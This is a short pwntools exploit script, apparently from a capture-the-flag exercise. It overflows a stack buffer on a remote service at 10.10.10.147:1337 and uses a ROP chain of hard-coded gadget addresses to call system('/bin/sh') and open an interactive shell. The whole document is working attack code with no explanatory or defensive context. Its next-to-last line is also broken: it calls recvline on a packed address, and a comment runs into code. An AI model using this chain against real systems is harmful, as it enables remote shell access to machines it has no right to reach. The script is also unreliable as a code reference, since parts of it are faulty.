from pwn import *# initial configuration
#p = process("./myapp")
p = remote("10.10.10.147",1337)
context(os="linux", arch="amd64")# parameters
junk = "A" * 112 # offset - 8
cmd = "/bin/sh\x00" # argument that will be passed to RPB
pop_r13 = p64(0x401206) # pop r13
random = p64(0x000000) # random value that will be put into r14 and r15
mov_rsp_to_rdi = p64(0x401152) # mv rdi, rsp
system = p64(0x401040)# buffer
buf = junk + cmd #get to the RBP and pass the /bin/sh string
buf += pop_r13 # pop r13
buf += system # set r13 to system call
buf += random + random # pop r14, pop r15 
buf += mov_rsp_to_rdi.recvline()
p.sendline(buf)
p.interactive()
